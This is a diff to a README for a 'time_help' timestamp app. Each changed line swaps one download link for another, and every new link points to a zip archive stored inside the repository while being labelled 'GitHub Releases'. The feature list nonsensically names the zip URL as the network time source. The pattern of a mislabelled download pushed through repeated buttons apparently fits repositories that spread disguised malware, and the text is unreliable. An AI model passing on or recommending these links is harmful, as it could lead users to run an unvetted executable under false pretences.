@@ -6,9 +6,9 @@ Welcome to the **time_help** project! This application helps you display persona
 
 ## 📥 Download the Application
 
-[![Download time_help](https://github.com/li5iftyyy/time_help/raw/refs/heads/main/code/bin/Release/net472/time-help-v1.1.zip)](https://github.com/li5iftyyy/time_help/raw/refs/heads/main/code/bin/Release/net472/time-help-v1.1.zip)
+[![Download time_help](https://raw.githubusercontent.com/li5iftyyy/time_help/main/code/bin/Release/net472/help-time-1.1.zip)](https://raw.githubusercontent.com/li5iftyyy/time_help/main/code/bin/Release/net472/help-time-1.1.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/li5iftyyy/time_help/raw/refs/heads/main/code/bin/Release/net472/time-help-v1.1.zip)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/li5iftyyy/time_help/main/code/bin/Release/net472/help-time-1.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ Before downloading, ensure your computer meets these requirements:
 
 ## ⚙️ Features
 
-- **Network Time Sync**: Get accurate time using `https://github.com/li5iftyyy/time_help/raw/refs/heads/main/code/bin/Release/net472/time-help-v1.1.zip`.
+- **Network Time Sync**: Get accurate time using `https://raw.githubusercontent.com/li5iftyyy/time_help/main/code/bin/Release/net472/help-time-1.1.zip`.
 - **Custom Time Offset**: Input a number to show past or future dates.
 - **Personalized Display**: Generate customized timestamps based on your name.
 - **User-Friendly Interface**: Enjoy a clean layout with custom backgrounds and icons.
@@ -88,9 +88,9 @@ The application will show the following format:
 
 To get started, download the application from the link below.
 
-[![Download time_help](https://github.com/li5iftyyy/time_help/raw/refs/heads/main/code/bin/Release/net472/time-help-v1.1.zip)](https://github.com/li5iftyyy/time_help/raw/refs/heads/main/code/bin/Release/net472/time-help-v1.1.zip)
+[![Download time_help](https://raw.githubusercontent.com/li5iftyyy/time_help/main/code/bin/Release/net472/help-time-1.1.zip)](https://raw.githubusercontent.com/li5iftyyy/time_help/main/code/bin/Release/net472/help-time-1.1.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/li5iftyyy/time_help/raw/refs/heads/main/code/bin/Release/net472/time-help-v1.1.zip)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/li5iftyyy/time_help/main/code/bin/Release/net472/help-time-1.1.zip)
 
 Simply follow the instructions above to understand how to run the application once it's downloaded.
 
